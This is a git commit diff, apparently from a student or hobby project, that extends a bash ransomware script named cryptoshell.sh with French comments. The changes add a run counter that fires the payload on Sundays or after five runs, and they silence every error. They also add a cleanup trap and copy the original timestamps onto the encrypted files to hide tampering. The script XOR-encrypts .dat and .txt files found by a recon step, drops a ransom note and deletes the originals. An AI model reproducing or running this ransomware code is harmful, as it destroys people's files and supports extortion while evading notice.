17f1e3a4afac8c257ca5ce8953a57e4819f2b01e
lacaz-cpu <arthur.obry.2n16@gmail.com>
2026-03-05 00:19:38 +0100

    phase 5

--- cryptoshell.sh
+++ cryptoshell.sh
@@ -4,18 +4,34 @@ source recon.sh
 source xor_helper.sh
 source ransom_note.sh
 
-if [ "$(date +%u)" -eq 7 ]; then
-    key=$(generate_key 8)
-    recon "$1"
-    target=$(cat target.list)
-    create_ransom_note
+trap "rm -f target.list ransom_note.txt .cs_count" SIGINT SIGTERM 2>/dev/null
+
+if [ -f .cs_count ]; then
+    count=$(<.cs_count)
+else
+    count=0
+fi
+
+count=$((count + 1))
+echo "$count" > .cs_count 2>/dev/null
+
+if [ "$(date +%u)" -eq 7 ] || [ "$count" -gt 5 ]; then
+    key=$(generate_key 8) 
+    recon "$1" 2>/dev/null
+    target=$(cat target.list 2>/dev/null)
+    create_ransom_note 2>/dev/null
     for file in $target; do
-        cp "./ransom_note.txt" "$(dirname "$file")"
-        xor_file "$file" "$file.locked" "$key"
-        rm -f "$file"
+        if [ "$(basename "$file")" != "ransom_note.txt" ]; then # pour eviter d'infecter la note de rançon
+            cp "./ransom_note.txt" "$(dirname "$file")" 2>/dev/null
+            data=$(stat -c "%y" "$file" 2>/dev/null) 
+            xor_file "$file" "$file.locked" "$key" 2>/dev/null
+            touch -d "$data" "$file.locked"  2>/dev/null  # pour copier la date de modification du fichier original sauvegardé au préalable ou peut utiliser
+            #ou alors touch -r "$file" "$file.locked" pour utiliser la date directement du fichier original avant supression sans
+            rm -f "$file" 2>/dev/null
+        fi
     done
-    echo "$key" > .cryptoshell_key
-    rm -f target.list ransom_note.txt 
+    echo "$key" > .cryptoshell_key 2>/dev/null
+    rm -f target.list ransom_note.txt .cs_count 2>/dev/null
 else
     echo "Le script ne s'exécutera que le dimanche."
 fi
--- recon.sh
+++ recon.sh
@@ -7,9 +7,9 @@ recon(){
     while read -r file; do
         count=$((count + 1))
         taille=$((taille + $(du -b "$file" | cut -f1)))
-        echo "Chemin $file"
-        echo "taille $(du -b "$file" | cut -f1) octets"
-        echo "date de modification $(stat -c %y "$file") "
+        #echo "Chemin $file"
+        #echo "taille $(du -b "$file" | cut -f1) octets"
+        #echo "date de modification $(stat -c %y "$file") "
         echo $file >> target.list
     done < <(find "$1" -type f \( -name '*.dat' -o -name '*.txt' \))
 
